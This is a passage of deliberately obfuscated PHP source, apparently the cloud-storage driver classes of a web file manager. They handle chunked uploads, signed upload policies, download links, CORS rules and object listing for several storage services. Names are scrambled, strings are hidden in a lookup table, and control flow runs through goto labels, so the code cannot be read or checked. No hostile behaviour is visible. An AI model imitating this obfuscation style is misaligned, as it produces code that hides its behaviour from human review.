$F’íÍªÂµ = 0; goto c·…Ú×£Ìİ; DàÓ†ì£©…: $bÊËÏë‡…Ø = 1024 * 1024 * 10; $DŸïâİŠ—¯ = array($e’ˆ–ÜËä“[1382], $e’ˆ–ÜËä“[1383] . $FôóØÁ½ˆš, $e’ˆ–ÜËä“[1384], $e’ˆ–ÜËä“[1385] . $bÊËÏë‡…Ø); $c•®èÎ„ï = $this->ussRequest($dƒ•Ì¯Œ, $e’ˆ–ÜËä“[226], !1, $DŸïâİŠ—¯); goto cÒµ™µ…¦ã; D£²¡¾ÍÆ›: do { $cÒòµæŠ = $eË“¥áäƒ[$e’ˆ–ÜËä“[1387]]; fseek_64($EÛÙå‚Š´, $F’íÍªÂµ); $C¸Å×Î‹Ç = fread($EÛÙå‚Š´, $cÒòµæŠ); $E²ÏÇèÙ´‚ = 0; do { $E²ÏÇèÙ´‚++; $eË“¥áäƒ = $this->uploadPart($dƒ•Ì¯Œ, $eË“¥áäƒ, $C¸Å×Î‹Ç); } while (!$eË“¥áäƒ && $E²ÏÇèÙ´‚ < 3); if (!$eË“¥áäƒ) { return !1; } $dŒ¾åßèô§ = $eË“¥áäƒ[$e’ˆ–ÜËä“[1386]]; $F’íÍªÂµ += $cÒòµæŠ; } while ($dŒ¾åßèô§ != -1); fclose($EÛÙå‚Š´); $DŸïâİŠ—¯ = array($e’ˆ–ÜËä“[1388], $e’ˆ–ÜËä“[1389] . $eË“¥áäƒ[$e’ˆ–ÜËä“[1390]], $e’ˆ–ÜËä“[1384]); goto C’¸‰âÏò; eóÍ©ÉæïÎ: $e’ˆ–ÜËä“ =& $_SERVER[›é¼±]; $FôóØÁ½ˆš = IO::size($F–ŒìÑ¾ª±); if ($FôóØÁ½ˆš <= 1024 * 1024 * 200) { $Côœõöê í = array($e’ˆ–ÜËä“[1381] . $F–ŒìÑ¾ª±); $c•®èÎ„ï = $this->ussRequest($dƒ•Ì¯Œ, $e’ˆ–ÜËä“[226], $Côœõöê í); return $c•®èÎ„ï[$e’ˆ–ÜËä“[1119]] ? $this->getPathOuter($dƒ•Ì¯Œ) : !1; } goto DàÓ†ì£©…; C’¸‰âÏò: $c•®èÎ„ï = $this->ussRequest($dƒ•Ì¯Œ, $e’ˆ–ÜËä“[226], !1, $DŸïâİŠ—¯); return $c•®èÎ„ï[$e’ˆ–ÜËä“[1119]] ? $this->getPathOuter($dˆóë„ºÓÜ) : !1; goto f¤à¢¹Çà; f¤à¢¹Çà: } private function uploadPart($E›…ÙãàÁ…, $C«Ùë½Ğˆ¬, &$dˆÂ£¸çó) { $Eè’áÑé«ì =& $_SERVER[›é¼±]; $FÑ·ßé¸Õà = array($Eè’áÑé«ì[1391], $Eè’áÑé«ì[1389] . $C«Ùë½Ğˆ¬[$Eè’áÑé«ì[1390]], $Eè’áÑé«ì[1392] . $C«Ùë½Ğˆ¬[$Eè’áÑé«ì[1386]], $Eè’áÑé«ì[141] . $C«Ùë½Ğˆ¬[$Eè’áÑé«ì[1387]]); $c‰Î…áñƒÇ = $this->ussRequest($E›…ÙãàÁ…, $Eè’áÑé«ì[226], $dˆÂ£¸çó, $FÑ·ßé¸Õà); return !$c‰Î…áñƒÇ[$Eè’áÑé«ì[1119]] ? $c‰Î…áñƒÇ[$Eè’áÑé«ì[1119]] : $c‰Î…áñƒÇ[$Eè’áÑé«ì[1121]]; } public function uploadFormData($BÀ™’°ï—‹, $dÄ¯ˆôÅÆ = 3600) { return $this->uploadPolicy($BÀ™’°ï—‹, $dÄ¯ˆôÅÆ); } public function multiUploadFormData($aÙŞæŠÊÙÒ, $BøÂÑáŸ”¸ = 3600) { $FÚÕŒ§»ô =& $_SERVER[›é¼±]; $Eƒ¨òŞ´‡ø = (int) $GLOBALS[$FÚÕŒ§»ô[7]][$FÚÕŒ§»ô[78]]; return $this->uploadPolicy($aÙŞæŠÊÙÒ, $BøÂÑáŸ”¸, $Eƒ¨òŞ´‡ø); } private function uploadPolicy($F§‚šÈæÅš, $EÊ‹×æ«ë = 3600, $cÃÏ¶êñˆ¼ = 0) { goto døÕ„‡§Ô˜; dÖ»ÉãøšÆ: $FÁˆŒ­ÅæÔ = array($a£î¢ƒ²èí[1393] => $this->bucket, $a£î¢ƒ²èí[1394] => $F§‚šÈæÅš, $a£î¢ƒ²èí[1395] => time() + $EÊ‹×æ«ë, $a£î¢ƒ²èí[1396] => $Eå‹šø‹É‰); if ($cÃÏ¶êñˆ¼) { $FÁˆŒ­ÅæÔ[$a£î¢ƒ²èí[1308]] = $cÃÏ¶êñˆ¼; } $eÃÍŒîÊ°Ì = base64_encode(json_encode($FÁˆŒ­ÅæÔ)); goto E¤ËŸä¶›é; døÕ„‡§Ô˜: $a£î¢ƒ²èí =& $_SERVER[›é¼±]; $eºÕ¿¨ğ© = $a£î¢ƒ²èí[8] . $this->bucket; $Eå‹šø‹É‰ = gmdate($a£î¢ƒ²èí[1328]); goto dÖ»ÉãøšÆ; E¤ËŸä¶›é: $FëàÙÊôÂ = base64_encode(hash_hmac($a£î¢ƒ²èí[1363], "\120\x4f\123\x54\46{$eºÕ¿¨ğ©}\46{$Eå‹šø‹É‰}\46{$eÃÍŒîÊ°Ì}", md5("{$this->userpass}"), !0)); $EÕ¢´’µŞ = array($a£î¢ƒ²èí[1234] => $eÃÍŒîÊ°Ì, $a£î¢ƒ²èí[1397] => "\x55\x50\x59\x55\x4e\x20{$this->username}\x3a{$FëàÙÊôÂ}", $a£î¢ƒ²èí[175] => $this->endpoint . $eºÕ¿¨ğ©); return $EÕ¢´’µŞ; goto Déôº’¢²“; Déôº’¢²“: } public function download($eÊ÷à¦¸«×, $cµâ¡Ë·óª) { goto fÃÚóí’‚¨; fÃÚóí’‚¨: $FÈÈµ¥à’ˆ = IO::getPathInner(IO::mkfile($cµâ¡Ë·óª)); if (!($b±ÕÕˆ± = $this->link($eÊ÷à¦¸«×))) { return !1; } $bŠ¬¡çĞÂ© = 0; goto d”ÏŠèøß§; d”ÏŠèøß§: $eÃè†¦à‡Ã = 1024 * 200; $F–Äô¹¼à’ = fopen($FÈÈµ¥à’ˆ, $_SERVER[›é¼±][1347]); while (!0) { $fß…ŞËŒ«Ë = $this->fileSubstr($eÊ÷à¦¸«×, $bŠ¬¡çĞÂ©, $eÃè†¦à‡Ã); if ($fß…ŞËŒ«Ë === !1) { return !1; } fwrite($F–Äô¹¼à’, $fß…ŞËŒ«Ë); $bŠ¬¡çĞÂ© += $eÃè†¦à‡Ã; if (strlen($fß…ŞËŒ«Ë) < $eÃè†¦à‡Ã) { break; } } goto bŒğ”»Õ‚ê; bŒğ”»Õ‚ê: fclose($F–Äô¹¼à’); return $cµâ¡Ë·óª; goto AĞ±î¡é…; AĞ±î¡é…: } public function link($F¼èÄŸ¹é¶, $fÕ¼‰‹ÒÆ¥ = array()) { $Cà¹ÉÊæÜ† =& $_SERVER[›é¼±]; $F¼èÄŸ¹é¶ = trim($F¼èÄŸ¹é¶, $Cà¹ÉÊæÜ†[8]); if (!empty($this->token)) { $AÀœ‚µßß = strtotime(date($Cà¹ÉÊæÜ†[1398])); $a—Ö±…Óò = substr(md5($this->token . $Cà¹ÉÊæÜ†[282] . $AÀœ‚µßß . $Cà¹ÉÊæÜ†[1399] . $F¼èÄŸ¹é¶), 12, 8) . $AÀœ‚µßß; $fÕ¼‰‹ÒÆ¥[] = $Cà¹ÉÊæÜ†[1400] . $a—Ö±…Óò; } $e†šˆøø‚¾ = !empty($fÕ¼‰‹ÒÆ¥) ? $Cà¹ÉÊæÜ†[70] . implode($Cà¹ÉÊæÜ†[282], $fÕ¼‰‹ÒÆ¥) : $Cà¹ÉÊæÜ†[33]; return $this->getHost() . $Cà¹ÉÊæÜ†[8] . $F¼èÄŸ¹é¶ . $e†šˆøø‚¾; } public function fileOut($e¯Š°¢ùÕ, $C‚áº¦¢Ğİ = false, $BĞ¿“íÑ½‚ = false, $A‡‡æÓŒ²ã = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($e¯Š°¢ùÕ, $C‚áº¦¢Ğİ, $BĞ¿“íÑ½‚, $A‡‡æÓŒ²ã); } if (!$BĞ¿“íÑ½‚) { $BĞ¿“íÑ½‚ = $this->pathThis($e¯Š°¢ùÕ); } $e¶ÂµÌ‰×¦ = $C‚áº¦¢Ğİ ? array($_SERVER[›é¼±][1401] . rawurlencode($BĞ¿“íÑ½‚)) : array(); $eòñ…­”†Î = $this->link($e¯Š°¢ùÕ, $e¶ÂµÌ‰×¦); $this->fileOutLink($eòñ…­”†Î); } public function fileOutServer($c°¼¯ö‚¶ˆ, $dóÉ¢©‘ó = false, $bĞôÓ°ËàŞ = false, $BÉî˜ùø© = '') { parent::fileOut($c°¼¯ö‚¶ˆ, $dóÉ¢©‘ó, $bĞôÓ°ËàŞ, $BÉî˜ùø©); } public function fileOutImage($AË¦éÄÊÎ, $c¨¯Ÿ†¤Îä = 250) { $c¬Ë‡Ì¬ò– = $this->link($AË¦éÄÊÎ . $_SERVER[›é¼±][1402] . $c¨¯Ÿ†¤Îä); $this->fileOutLink($c¬Ë‡Ì¬ò–); } public function fileOutImageServer($dİ©ÓÀÕ©ƒ, $E­éëáñš— = 250) { parent::fileOutImage($dİ©ÓÀÕ©ƒ, $E­éëáñš—); } public function hashMd5($a¦ÅˆĞ) { $cê»÷¥œÙ =& $_SERVER[›é¼±]; $dÉ£ÜÅø = $this->_objectMeta($a¦ÅˆĞ); return isset($dÉ£ÜÅø[$cê»÷¥œÙ[208]]) ? $dÉ£ÜÅø[$cê»÷¥œÙ[208]] : !1; } public function size($BËñÈÇŞÃ·) { $dáŒ¬ôÂ¶ù = $this->objectMeta($BËñÈÇŞÃ·); return $dáŒ¬ôÂ¶ù ? $dáŒ¬ôÂ¶ù[$_SERVER[›é¼±][78]] : 0; } public function info($D¤ÌÚƒ·÷) { if ($this->isFolder($D¤ÌÚƒ·÷)) { return $this->folderInfo($D¤ÌÚƒ·÷); } else { if ($this->isFile($D¤ÌÚƒ·÷)) { return $this->fileInfo($D¤ÌÚƒ·÷); } } return !1; } public function exist($bÅ‚Ì„È‰) { return $this->isFile($bÅ‚Ì„È‰) || $this->isFolder($bÅ‚Ì„È‰); } public function isFile($bª×ñè¦Ê) { return !$this->isFolder($bª×ñè¦Ê) && $this->objectMeta($bª×ñè¦Ê); } public function isFolder($Cà†Ñ…ç‡²) { return $this->cacheMethod($_SERVER[›é¼±][199], $Cà†Ñ…ç‡²); } protected function objectMeta($DˆŞâ”ãˆÈ) { return $this->cacheMethod($_SERVER[›é¼±][200], $DˆŞâ”ãˆÈ); } protected function _objectMeta($AÆŠ¶Áù¤ˆ) { goto BÎêß¨éÂ; BÎêß¨éÂ: $Cğ÷ë¢ß³ß =& $_SERVER[›é¼±]; if ($AÆŠ¶Áù¤ˆ == $Cğ÷ë¢ß³ß[33] || $AÆŠ¶Áù¤ˆ == $Cğ÷ë¢ß³ß[8]) { return array(); } $F‹Ø±ƒÕ™Ğ = $this->ussRequest($AÆŠ¶Áù¤ˆ, $Cğ÷ë¢ß³ß[1403]); goto BÜãø·¨à›; BÜãø·¨à›: if (!$F‹Ø±ƒÕ™Ğ[$Cğ÷ë¢ß³ß[1119]]) { return null; } $cœµğÉ„İ¯ = isset($F‹Ø±ƒÕ™Ğ[$Cğ÷ë¢ß³ß[1121]]) ? $F‹Ø±ƒÕ™Ğ[$Cğ÷ë¢ß³ß[1121]] : array(); if (!isset($cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1404]])) { return null; } goto B½ãŠ·ô; B½ãŠ·ô: $Eƒ¶ˆ·ßÅô = array($Cğ÷ë¢ß³ß[29] => isset($cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1404]]) ? $cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1404]] : null, $Cğ÷ë¢ß³ß[78] => isset($cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1405]]) ? $cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1405]] : null, $Cğ÷ë¢ß³ß[208] => isset($cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1406]]) ? $cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1406]] : null, $Cğ÷ë¢ß³ß[1373] => isset($cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1407]]) ? $cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1407]] : null); $Eƒ¶ˆ·ßÅô[$Cğ÷ë¢ß³ß[1374]] = isset($cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1408]]) ? strtotime($cœµğÉ„İ¯[$Cğ÷ë¢ß³ß[1408]]) : $Eƒ¶ˆ·ßÅô[$Cğ÷ë¢ß³ß[1373]]; return $Eƒ¶ˆ·ßÅô; goto Aœ„ò¢Ó©õ; Aœ„ò¢Ó©õ: } protected function _isFolder($FšÓ„âçÄ) { $E¬ˆ†—Ô¬É =& $_SERVER[›é¼±]; if ($FšÓ„âçÄ == $E¬ˆ†—Ô¬É[33] || $FšÓ„âçÄ == $E¬ˆ†—Ô¬É[8]) { return !0; } $eÆÕíÂ‰ = $this->_objectMeta($FšÓ„âçÄ); return isset($eÆÕíÂ‰[$E¬ˆ†—Ô¬É[29]]) && $eÆÕíÂ‰[$E¬ˆ†—Ô¬É[29]] == $E¬ˆ†—Ô¬É[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($f¡¾æŸŒ Å = false) { } public function exist($C’”¢•¸Š) { $cˆ†ùùæ—ß = $this->info($C’”¢•¸Š); return $cˆ†ùùæ—ß[$_SERVER[›é¼±][195]]; } public function isFile($BÑÒ¶ñ¸Â) { $fò¦òò² = $this->info($BÑÒ¶ñ¸Â); return $fò¦òò²[$_SERVER[›é¼±][195]]; } public function isFolder($b¿ÖÍËÂÔ÷) { return !1; } public function size($a¦á“ö„„‚) { $aòÌî…—…ƒ = $this->info($a¦á“ö„„‚); return $aòÌî…—…ƒ[$_SERVER[›é¼±][78]]; } public function info($F’²ÃÊÕ°¾) { return $this->infoParse($F’²ÃÊÕ°¾); } public function infoAuth($eë‘İØ‹•õ) { return $this->infoParse($eë‘İØ‹•õ); } public function infoWithChildren($Dà¶à½ùª) { return $this->infoParse($Dà¶à½ùª); } public function infoFull($bµïñ“Õù†) { return $this->infoParse($bµïñ“Õù†); } private function infoParse($f…‡œ—®èÚ) { $e˜­øòˆœ =& $_SERVER[›é¼±]; $b’¾´Œ¸ªƒ = $this->header($f…‡œ—®èÚ); if (!$b’¾´Œ¸ªƒ || !$b’¾´Œ¸ªƒ[$e˜­øòˆœ[745]]) { return !1; } $DëñßôÌš³ = _get($b’¾´Œ¸ªƒ, $e˜­øòˆœ[335], 0); $a„ğŸÖ¾»ƒ = array($e˜­øòˆœ[28] => $b’¾´Œ¸ªƒ[$e˜­øòˆœ[28]], $e˜­øòˆœ[76] => $f…‡œ—®èÚ, $e˜­øòˆœ[29] => $e˜­øòˆœ[193], $e˜­øòˆœ[78] => intval($DëñßôÌš³), $e˜­øòˆœ[168] => get_path_ext($b’¾´Œ¸ªƒ[$e˜­øòˆœ[28]]), $e˜­øòˆœ[1289] => $DëñßôÌš³ > 0 && $b’¾´Œ¸ªƒ[$e˜­øòˆœ[1409]], $e˜­øòˆœ[1290] => !1); return $a„ğŸÖ¾»ƒ; } private function header($BÄÁ°–ˆ—×) { goto bîÈâÜÑÃé; bîÈâÜÑÃé: $B‹îóñÈÚÎ =& $_SERVER[›é¼±]; if (isset(self::$_cacheHeader[$BÄÁ°–ˆ—×])) { return self::$_cacheHeader[$BÄÁ°–ˆ—×]; } $E¡®ŒÔÔ» = isset($GLOBALS[$B‹îóñÈÚÎ[1410]]) ? $GLOBALS[$B‹îóñÈÚÎ[1410]] : !1; goto CŒñ·ª³Œ; CŒñ·ª³Œ: $GLOBALS[$B‹îóñÈÚÎ[1410]] = !0; self::$_cacheHeader[$BÄÁ°–ˆ—×] = url_header($BÄÁ°–ˆ—×); $GLOBALS[$B‹îóñÈÚÎ[1410]] = $E¡®ŒÔÔ»; goto Bè×›íÌï„; Bè×›íÌï„: return self::$_cacheHeader[$BÄÁ°–ˆ—×]; goto B®¥İƒö»ó; B®¥İƒö»ó: } public function hashSimple($a¦º¥´øğÊ, $döÂîŠìÆù = false) { goto eÌïÁ¿ğ; fÌ¹²Ù›ˆ¯: $FÃ‡•øµ‘— .= $this->fileSubstr($a¦º¥´øğÊ, $DÄœÏ®Õ—à - $D©¢ÏÍŒíÚ, $D©¢ÏÍŒíÚ); return md5($FÃ‡•øµ‘—) . $DÄœÏ®Õ—à; goto fåàò¬ø´Ë; eÌïÁ¿ğ: $f‰æ“ÁÜ³é =& $_SERVER[›é¼±]; $F¹ò×æê²ö = $this->info($a¦º¥´øğÊ); if (!$F¹ò×æê²ö || !$F¹ò×æê²ö[$f‰æ“ÁÜ³é[195]]) { return !1; } goto fôšŞÍÇ£; fôšŞÍÇ£: $DÄœÏ®Õ—à = $F¹ò×æê²ö[$f‰æ“ÁÜ³é[78]]; $D©¢ÏÍŒíÚ = 200; $Aº¿ÛÁš¥Ÿ = 50; goto a‚¸©ÎÒ˜±; A¶É¿„ºª¸: $a¥‚ö‡‹ Ú = timeFloat(); $f‰êÚ‡ = 15; for ($b„Â¯ë–îè = 0; $b„Â¯ë–îè < $Aº¿ÛÁš¥Ÿ; $b„Â¯ë–îè++) { if (timeFloat() - $a¥‚ö‡‹ Ú > $f‰êÚ‡) { return !1; } $fØù‡Ÿğ = $this->fileSubstr($a¦º¥´øğÊ, $e°ñ¸ŸêîÏ * $b„Â¯ë–îè, $D©¢ÏÍŒíÚ); if (!$fØù‡Ÿğ) { return !1; } $FÃ‡•øµ‘— .= $fØù‡Ÿğ; } goto fÌ¹²Ù›ˆ¯; a‚¸©ÎÒ˜±: if ($DÄœÏ®Õ—à <= $D©¢ÏÍŒíÚ * $Aº¿ÛÁš¥Ÿ) { return md5($this->fileSubstr($a¦º¥´øğÊ, 0, $DÄœÏ®Õ—à)) . $DÄœÏ®Õ—à; } $e°ñ¸ŸêîÏ = intval($DÄœÏ®Õ—à / $Aº¿ÛÁš¥Ÿ); $FÃ‡•øµ‘— = $f‰æ“ÁÜ³é[33]; goto A¶É¿„ºª¸; fåàò¬ø´Ë: } public function getContent($D˜ÙóÇñº) { return $this->fileSubstr($D˜ÙóÇñº); } public function fileSubstr($A…²á´†‡, $EÕ¥¢áÕá­ = 0, $cæø¦½‹  = -1) { goto d°·‹Ğñ¾; d°·‹Ğñ¾: $e†ÛÑ˜ÈÑ“ =& $_SERVER[›é¼±]; $Aš Æ´Ö÷ß = $this->info($A…²á´†‡); if (!$Aš Æ´Ö÷ß || !$Aš Æ´Ö÷ß[$e†ÛÑ˜ÈÑ“[195]] && $Aš Æ´Ö÷ß[$e†ÛÑ˜ÈÑ“[78]] > 1024 * 1024 * 10) { return !1; } goto AÆ£›¦ÔØ˜; E¦ßÖª«¶™: $BÅÔ‰¦ö× = url_request($A…²á´†‡, $e†ÛÑ˜ÈÑ“[228], !1, $Cƒ‰ïß¢ÆÌ, !1, !1, 1); return $BÅÔ‰¦ö×[$e†ÛÑ˜ÈÑ“[1121]] ? $BÅÔ‰¦ö×[$e†ÛÑ˜ÈÑ“[1121]] : $e†ÛÑ˜ÈÑ“[33]; goto A±¸“õÂø; AÆ£›¦ÔØ˜: if ($cæø¦½‹  === -1) { $cæø¦½‹  = $Aš Æ´Ö÷ß[$e†ÛÑ˜ÈÑ“[78]]; } if ($cæø¦½‹  == 0) { return $e†ÛÑ˜ÈÑ“[33]; } $Cƒ‰ïß¢ÆÌ = array($e†ÛÑ˜ÈÑ“[1411] . $EÕ¥¢áÕá­ . $e†ÛÑ˜ÈÑ“[779] . ($EÕ¥¢áÕá­ + $cæø¦½‹  - 1)); goto E¦ßÖª«¶™; A±¸“õÂø: } public function download($aÒÍ¢ÀÕÔ, $DÖõÁ×¿‚Û) { Downloader::start($aÒÍ¢ÀÕÔ, $DÖõÁ×¿‚Û); return $DÖõÁ×¿‚Û; } } goto E±«»‰ìÓ‚; BĞÁñŞäØŠ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($A¥”ğßœ) { parent::__construct($A¥”ğßœ); $this->signatureVersion($_SERVER[›é¼±][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($c´í¤–ñ£ê) { parent::__construct($c´í¤–ñ£ê); $this->signatureVersion($_SERVER[›é¼±][212]); } public function fileOutLink($DÇ±°í©¿´) { $A±ÖŒì“ØÇ =& $_SERVER[›é¼±]; if (substr($DÇ±°í©¿´, 0, 7) == $A±ÖŒì“ØÇ[1237]) { $DÇ±°í©¿´ = $A±ÖŒì“ØÇ[1238] . substr($DÇ±°í©¿´, 7); } header($A±ÖŒì“ØÇ[159] . $DÇ±°í©¿´); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($bø¥ÉŞæß) { parent::__construct(); include_once SDK_DIR . $_SERVER[›é¼±][1293]; $this->_init($bø¥ÉŞæß); } public function _init($D—·¡¹§¥‰) { $Aì«¾ =& $_SERVER[›é¼±]; foreach ($D—·¡¹§¥‰ as $BÒ¯Ğ©Ìí => $c¯ã‡¬ÑÙì) { if (isset($this->{$BÒ¯Ğ©Ìí})) { $this->{$BÒ¯Ğ©Ìí} = $c¯ã‡¬ÑÙì; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Aì«¾[1294] . LNG($Aì«¾[1295])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto CŸÀŠ¦ÆÖº; EÆ®ÏŒÃ´¬: $Aóğ¦ˆ¸²Ì->addAllowedOrigin($EšÀ”¾Ïˆ[1296]); $Aóğ¦ˆ¸²Ì->addAllowedMethod($EšÀ”¾Ïˆ[1297]); $Aóğ¦ˆ¸²Ì->addAllowedMethod($EšÀ”¾Ïˆ[1298]); goto BŞí¼àÙ; CÌ•æ¦±Ñ: $DŠ£ ‰¢­->addRule($Aóğ¦ˆ¸²Ì); try { $this->client->putBucketCors($this->bucket, $DŠ£ ‰¢­); } catch (OSS\Core\OssException $b™ˆåá£„¡) { return !1; } return !0; goto D¸…¢ìµù¿; bäèºÓ¤£Æ: $Aóğ¦ˆ¸²Ì->setMaxAgeSeconds(600); $Aóğ¦ˆ¸²Ì->addExposeHeader($EšÀ”¾Ïˆ[1301]); $Aóğ¦ˆ¸²Ì->addAllowedHeader($EšÀ”¾Ïˆ[1296]); goto CÌ•æ¦±Ñ; BŞí¼àÙ: $Aóğ¦ˆ¸²Ì->addAllowedMethod($EšÀ”¾Ïˆ[1299]); $Aóğ¦ˆ¸²Ì->addAllowedMethod($EšÀ”¾Ïˆ[1300]); $Aóğ¦ˆ¸²Ì->addAllowedMethod($EšÀ”¾Ïˆ[158]); goto bäèºÓ¤£Æ; CŸÀŠ¦ÆÖº: $EšÀ”¾Ïˆ =& $_SERVER[›é¼±]; $DŠ£ ‰¢­ = new OSS\Model\CorsConfig(); $Aóğ¦ˆ¸²Ì = new OSS\Model\CorsRule(); goto EÆ®ÏŒÃ´¬; D¸…¢ìµù¿: } public function getBucketCors() { goto D‰Í”™ñŠ; CÌÖ¾–ª‰ì: $A”ˆíó™à = $eƒïˆƒá¦[0]->getMaxAgeSeconds(); $eºù¹Ï¨ïÀ = $eƒïˆƒá¦[0]->getExposeHeaders(); $e†Ô‚÷ĞĞ = $eƒïˆƒá¦[0]->getAllowedHeaders(); goto F‰µƒëš¾ì; F‰µƒëš¾ì: return array($DÚª¨ò¦ëŠ[181] => isset($c»«¹ÚÌ[0]) ? $c»«¹ÚÌ[0] : $DÚª¨ò¦ëŠ[33], $DÚª¨ò¦ëŠ[185] => $bèÅù°Á¬¶, $DÚª¨ò¦ëŠ[1302] => $A”ˆíó™à, $DÚª¨ò¦ëŠ[1303] => isset($eºù¹Ï¨ïÀ[0]) ? $eºù¹Ï¨ïÀ[0] : $DÚª¨ò¦ëŠ[33], $DÚª¨ò¦ëŠ[183] => isset($e†Ô‚÷ĞĞ[0]) ? $e†Ô‚÷ĞĞ[0] : $DÚª¨ò¦ëŠ[33]); goto EÖÂÜÁŸãí; aóÀ¾º„ö: if (!$c öÙÇÄƒï || !($eƒïˆƒá¦ = $c öÙÇÄƒï->getRules())) { return null; } $c»«¹ÚÌ = $eƒïˆƒá¦[0]->getAllowedOrigins(); $bèÅù°Á¬¶ = $eƒïˆƒá¦[0]->getAllowedMethods(); goto CÌÖ¾–ª‰ì; D‰Í”™ñŠ: $DÚª¨ò¦ëŠ =& $_SERVER[›é¼±]; $c öÙÇÄƒï = null; try { $c öÙÇÄƒï = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $C—Šø£Õ«¯) { return null; } goto aóÀ¾º„ö; EÖÂÜÁŸãí: } public function isBucketCors() { goto fİÉ¯ÁÂì; aœ–½Ê‘í´: if ($BË¨–¦ëÔ×[$c…ªˆíÛ³[181]] != $c…ªˆíÛ³[182] || $BË¨–¦ëÔ×[$c…ªˆíÛ³[183]] != $c…ªˆíÛ³[182]) { return !1; } $EÆà«†çÙ = array_map($c…ªˆíÛ³[184], $BË¨–¦ëÔ×[$c…ªˆíÛ³[185]]); if (!is_array($EÆà«†çÙ)) { $EÆà«†çÙ = array(); } goto d¬À“Ü¹Š; fİÉ¯ÁÂì: $c…ªˆíÛ³ =& $_SERVER[›é¼±]; $BË¨–¦ëÔ× = $this->getBucketCors(); if (!$BË¨–¦ëÔ× || !is_array($BË¨–¦ëÔ×)) { return !1; } goto aœ–½Ê‘í´; d¬À“Ü¹Š: $f‡Ëˆ¼ÆÕ = array($c…ªˆíÛ³[186], $c…ªˆíÛ³[187], $c…ªˆíÛ³[188], $c…ªˆíÛ³[189], $c…ªˆíÛ³[190]); $A„ÃêùÃ‘ = array_diff($f‡Ëˆ¼ÆÕ, $EÆà«†çÙ); return empty($A„ÃêùÃ‘); goto B„³¹ÖÛÛ; B„³¹ÖÛÛ: } public function mkfile($AµÚšÎÊÁê, $D’à¿†Äµ = '', $Cø‚›æ¯Æ‰ = REPEAT_RENAME) { $f¨¨à½¶Á = $this->setContent($AµÚšÎÊÁê, $D’à¿†Äµ); if ($f¨¨à½¶Á !== !1) { return $this->getPathOuter($AµÚšÎÊÁê); } return !1; } public function mkdir($a…õŸ¥á×Ÿ, $fßö¤İÈ¡” = REPEAT_SKIP) { if ($this->_isFolder($a…õŸ¥á×Ÿ)) { return $this->getPathOuter($a…õŸ¥á×Ÿ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($a…õŸ¥á×Ÿ)); } catch (OSS\Core\OssException $bÎ£”À¾ßÇ) { return !1; } return $this->getPathOuter($a…õŸ¥á×Ÿ); } private function fileList($bšµÛÛãÔá, $cÒ“¯º»œ˜ = '', $C£†‚òï á = 0) { goto F¨„×ÊÌ”±; F¨„×ÊÌ”±: $CªµÉ·¿…õ =& $_SERVER[›é¼±]; $bšµÛÛãÔá = trim($bšµÛÛãÔá, $CªµÉ·¿…õ[8]); $A‚ˆÁÆŒÍ‰ = empty($bšµÛÛãÔá) && $bšµÛÛãÔá !== $CªµÉ·¿…õ[191] ? $CªµÉ·¿…õ[33] : $bšµÛÛãÔá . $CªµÉ·¿…õ[8]; goto eÒëÀ¹Ú†´; fèÂÃÆ…Šœ: return array($CªµÉ·¿…õ[75] => $BÖê±‹·öÁ, $CªµÉ·¿…õ[74] => $cİ›”××é); goto f´©×·ëŞ–; eÒëÀ¹Ú†´: $fÛ±ÉÂ¸ÂÓ = $CªµÉ·¿…õ[33]; $eïŞ“»´²² = 1000; $eí›‘ãÓ = $this->listItemCache === !1 ? !1 : !0; goto E“òŒ—ÃöÖ; E“òŒ—ÃöÖ: $BÖê±‹·öÁ = $cİ›”××é = array(); while (!0) { check_abort(); $d„°Í¡¢°ç = array($CªµÉ·¿…õ[1304] => $cÒ“¯º»œ˜, $CªµÉ·¿…õ[1305] => $A‚ˆÁÆŒÍ‰, $CªµÉ·¿…õ[1306] => $eïŞ“»´²², $CªµÉ·¿…õ[1307] => $fÛ±ÉÂ¸ÂÓ); try { $Aˆ®­öãª› = $this->client->listObjects($this->bucket, $d„°Í¡¢°ç); } catch (OSS\Core\OssException $B´İöè’Ú) { break; } $fÛ±ÉÂ¸ÂÓ = $Aˆ®­öãª›->getNextMarker(); $D„„¶ù¾Á½ = $Aˆ®­öãª›->getObjectList(); $EšÄ§ã£ª¼ = $Aˆ®­öãª›->getPrefixList(); foreach ($D„„¶ù¾Á½ as $F›¶ä–ôœí) { goto EŸá¬¸Ÿ•Ë; b­¥ÖŒ‰©: $c™­¼™íî» = $F›¶ä–ôœí->getLastModified(); $d«‡Ûçø·Ó = $C£†‚òï á ? array($CªµÉ·¿…õ[28] => $FØ•ÒÊŸÌ”, $CªµÉ·¿…õ[78] => $Fµ±¥†”òË, $CªµÉ·¿…õ[197] => strtotime($c™­¼™íî»)) : $FØ•ÒÊŸÌ”; $fŠÌ»×È«Ü = $Fµ±¥†”òË == 0 && substr($FØ•ÒÊŸÌ”, strlen($FØ•ÒÊŸÌ”) - 1, 1) == $CªµÉ·¿…õ[8] ? !0 : !1; goto càæö´‹ó™; càæö´‹ó™: if ($eí›‘ãÓ) { $this->cacheMethod($CªµÉ·¿…õ[199], $FØ•ÒÊŸÌ”, $fŠÌ»×È«Ü); 